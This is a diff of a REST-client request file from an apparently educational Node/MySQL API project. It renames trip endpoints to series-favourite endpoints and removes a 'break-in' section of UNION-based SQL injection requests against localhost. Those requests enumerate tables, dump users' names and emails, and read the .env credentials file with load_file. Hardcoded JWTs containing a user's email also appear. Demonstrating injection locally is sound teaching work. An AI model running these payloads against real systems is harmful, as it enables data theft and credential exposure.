@@ -103,78 +103,59 @@ Content-Type: application/json
     "id": 11
 }
 
-### get favrite
-get http://localhost:3000/api/trips
+### get favorite
+get http://localhost:3000/api/user/favorite
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTQ0NjI3MiwiZXhwIjoxNjQ1NDQ5ODcyfQ.mt6Ga598tVLQ3QXty4BF-amaU2Jbaww4U5z5AaUXvsg
 
-### get tripscar
-get http://localhost:3000/api/tripscar
+### get favorite series
+get http://localhost:3000/api/user/favorite/series
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTE4NDU0OCwiZXhwIjoxNjQ1MTg4MTQ4fQ.ZfziExVQH3QxqR0Fy9TEVcgbaFfrEnyNDVhuF389Irw
 
 
-### Egy trip
-get http://localhost:3000/api/trips/1
+### Egy favorite
+get http://localhost:3000/api/user/favorite
 Authorization: Bearer
 
-### Egy autó tripjei trip
-get http://localhost:3000/api/tripsbycarid/2
-Authorization: Bearer
+# ### Egy autó tripjei trip
+# get http://localhost:3000/api/tripsbycarid/2
+# Authorization: Bearer
 
 ### favorite hozzáadása
-post http://localhost:3000/api/favorite
+post http://localhost:3000/api/user/series/favorite
 Content-Type: application/json
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTQ0NjI3MiwiZXhwIjoxNjQ1NDQ5ODcyfQ.mt6Ga598tVLQ3QXty4BF-amaU2Jbaww4U5z5AaUXvsg
 
 { 
-    "userId": "14", 
-    "seriesId": "1", 
+    "userId": "10", 
+    "seriesId": "12", 
     "Watched": "watched"
  }
 
-### trip módosítása
-put http://localhost:3000/api/trips
+### favorite módosítása
+put http://localhost:3000/api/user/series/favorite
 Content-Type: application/json
 
 {
-    "numberOfMinutes": 13,
-    "date": "2013.12.18 13:17:17",
-    "carId": 2,
-    "id": 13
+    "userId": "12",
+    "seriesId": "13",
+    "Watched": "progress",
+    "id": 7 
+    
 }
 
-### Delete trip
-delete http://localhost:3000/api/trips
+### Delete favorite
+delete http://localhost:3000/api/user/series/favorite
 Content-Type: application/json
 
 {
-    "id": 13
+    "id": 7
 }
 
+### Get favorite
+get http://localhost:3000/api/user/series/favorite
 
 
-### Autók cars ahol hourlyRate: hr kisebb mint (smaller than): st 5000
-get http://localhost:3000/api/carshrst/3300
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTEyNTYzOCwiZXhwIjoxNjQ1MTI5MjM4fQ.62U_xM_tXvohkZ1TlZqxSLLil5Y1dTbfmPgB2JYUlsQ
-
-
-### Betörés
-### adatbázis lekérdezése
-get http://localhost:3000/api/carshrst/3100 union '', select database(), '', ''
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUwOTI2MSwiZXhwIjoxNjQ1NTEyODYxfQ._qC5Aig2xIdLg_bIISkLQOPtd4v4OH833KUt06A79r0
-
-### táblák lekérdezése
-get http://localhost:3000/api/carshrst/3100 union select '', '', '',table_name from information_schema.tables where table_schema='my_auth'
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUwOTI2MSwiZXhwIjoxNjQ1NTEyODYxfQ._qC5Aig2xIdLg_bIISkLQOPtd4v4OH833KUt06A79r0
-
-### users táblában milyen oszlopok típussal
-get http://localhost:3000/api/carshrst/3100 union select data_type, '', '', column_name from information_schema.columns where table_name='registration'
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUwOTI2MSwiZXhwIjoxNjQ1NTEyODYxfQ._qC5Aig2xIdLg_bIISkLQOPtd4v4OH833KUt06A79r0
-
-
-### users tábla adatainak kilopása
-get http://localhost:3000/api/carshrst/3100 union select gender, firstName, lastName, email from registration
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NDMxNTE5NCwiZXhwIjoxNjQ0MzE4Nzk0fQ.q2ih8UiVs51Pa3UEc908O6tLt5Upl9NOlidEmQSksMQ
-
-### Adatbázis hozzáférés kilopása
-get http://localhost:3000/api/carshrst/3100 union select '', load_file('D:\\zzz\\authWithMysql\\.env') file, '','';
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUxMDA0MywiZXhwIjoxNjQ1NTEzNjQzfQ.m8wv5Wszpc-nPeHFB4FrU_va1C5ZVPYvMEbD4mYL92U
+# ### Betörés
+# ### adatbázis lekérdezése
+# get http://localhost:3000/api/user/seriesr:12 union '', select database(), '', ''
+# Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXN1bHQiOnsiaWQiOjEsImZpcnN0TmFtZSI6IkLDqWxhIiwibGFzdE5hbWUiOiJOYWd5b24iLCJnZW5kZXIiOiJmw6lyZmkiLCJlbWFpbCI6Im5hZ3kuYmVsYUBnbWFpbC5jb20iLCJudW1iZXIiOjM0MzQzNTUzNH0sImlhdCI6MTY0NTUwOTI2MSwiZXhwIjoxNjQ1NTEyODYxfQ._qC5Aig2xIdLg_bIISkLQOPtd4v4OH833KUt06A79r0
